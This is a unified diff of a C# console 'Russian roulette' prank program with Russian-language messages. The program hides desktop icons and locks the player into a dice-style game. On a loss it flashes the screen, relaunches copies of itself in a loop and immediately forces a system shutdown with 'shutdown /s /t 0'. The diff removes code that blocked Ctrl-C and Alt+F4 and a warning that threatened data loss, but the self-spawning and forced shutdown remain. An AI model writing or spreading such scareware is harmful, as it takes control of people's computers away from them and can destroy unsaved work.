@@ -9,8 +9,7 @@ namespace RussianRoulette
 {
     internal class Program
     {
-        [DllImport("Kernel32")]
-        private static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate HandlerRoutine, bool Add);
+      
 
         private delegate bool ConsoleCtrlDelegate(CtrlTypes CtrlType);
 
@@ -22,24 +21,6 @@ namespace RussianRoulette
         }
 
         private static bool ConsoleCtrlCheck(CtrlTypes ctrlType) => true;
-
-        static void StartKeyInterceptor()
-        {
-            Thread inputThread = new Thread(() =>
-            {
-                while (true)
-                {
-                    var key = Console.ReadKey(false);
-                    if (key.Key == ConsoleKey.F4 && key.Modifiers.HasFlag(ConsoleModifiers.Alt))
-                    {
-                        continue;
-                    }
-                }
-            });
-
-            inputThread.IsBackground = true;
-            inputThread.Start();
-        }
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr GetConsoleWindow();
@@ -81,8 +62,6 @@ namespace RussianRoulette
 
         static void Main(string[] args)
         {
-            SetConsoleCtrlHandler(ConsoleCtrlCheck, true);
-            StartKeyInterceptor();
 
             IntPtr handle = GetConsoleWindow();
             ShowWindow(handle, SW_MAXIMIZE);
@@ -123,8 +102,7 @@ namespace RussianRoulette
 >> Добро пожаловать в 'РУССКУЮ РУЛЕТКУ: СИСТЕМНОЕ ИСПЫТАНИЕ'
 
 Ты сделал свой выбор — и пути назад больше нет.
-С этого момента ты — участник. Попытка закрыть окно, перезагрузить ПК,
-или нажать ALT+F4 — приведёт к немедленной потере данных твоего устройства.
+С этого момента ты — участник. 
 
 Игра не спросит, готов ли ты. Игра просто начнётся.
 
@@ -150,7 +128,6 @@ namespace RussianRoulette
                     Console.Clear();
                     Thread.Sleep(1000);
                 }
-                Environment.Exit(0);
             }
             Game(args);
         }
@@ -180,7 +157,7 @@ namespace RussianRoulette
                 string input = Console.ReadLine();
                 if (int.TryParse(input, out num) && num >= 1 && num <= 6)
                     break;
-                Console.WriteLine("⚠ Введено некорректное значение! Попробуй снова.");
+                Console.WriteLine("Введено некорректное значение! Попробуй снова. ⚠");
             }
 
             Random rnd = new Random();
@@ -194,40 +171,38 @@ namespace RussianRoulette
                 Win();
         }
 
+        static void Win()
+        {
+            DesktopIcons.SetDesktopIconsVisible(true);
+            Console.WriteLine("Ты выиграл...");
+            Thread.Sleep(5000);
+        }
+
         static void Died()
         {
-            IntPtr handle = GetConsoleWindow();
-            ShowWindow(handle, 9);
             Console.Clear();
             Console.ForegroundColor = ConsoleColor.Red;
             Console.WriteLine("УПС... Ты проиграл :)");
-            Thread.Sleep(300);
+            Thread.Sleep(100);
 
             ConsoleColor[] colors = (ConsoleColor[])Enum.GetValues(typeof(ConsoleColor));
             Random rnd = new Random();
 
-            for (int i = 0; i < 100; i++)
+            for (int i = 0; i < 10; i++)
             {
                 Console.BackgroundColor = colors[rnd.Next(colors.Length)];
                 Console.Clear();
                 Thread.Sleep(5);
-                ShowWindow(handle, 9);
                 
             }
 
-           
-            ShowWindow(handle, 9);
-
-
             string exePath = Process.GetCurrentProcess().MainModule.FileName;
-            for (int i = 0; i < 1000; i++)
+            for (int i = 0; i < 10; i++)
             {
                 Console.Clear();
                 Process.Start(exePath, "child");
                 
-                ShowWindow(handle, 9);
             }
-            ShowWindow(handle, 9);
 
             Process.Start(new ProcessStartInfo("shutdown", "/s /t 0")
             {
@@ -237,11 +212,7 @@ namespace RussianRoulette
         }
 
 
-        static void Win()
-        {
-            DesktopIcons.SetDesktopIconsVisible(true);
-            Environment.Exit(0);
-        }
+        
     }
 
     class DesktopIcons
